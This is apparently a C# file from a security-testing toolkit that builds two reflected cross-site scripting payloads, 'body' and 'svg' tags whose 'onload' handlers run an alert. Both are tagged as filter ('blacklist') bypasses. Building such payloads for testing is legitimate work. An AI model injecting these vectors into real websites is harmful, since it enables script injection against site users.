using System.Collections.Generic;

namespace AllTheThings
{
    #region refrences
    // Project
    using PayloadLibrary.CrossSiteScriptingPayloadLibrary;
    #endregion

    static class BuildCrossSitePayloads
    {
        public static void BuildCrossSiteScriptingPayloads()
        {
            var xssLib = new ReflectedCrossSiteScriptingPayloadLibrary();
            xssLib.StorePayload(xssLib.CreatePayload("body", "onload", @"alert('l33t')", new List<string>{"html4"}, new List<string>{ "blacklistbypass"}));
            xssLib.StorePayload(xssLib.CreatePayload("svg", "onload", @"alert('l33t')", new List<string> {"html5"}, new List<string> { "blacklistbypass"}));
        }
    }
}
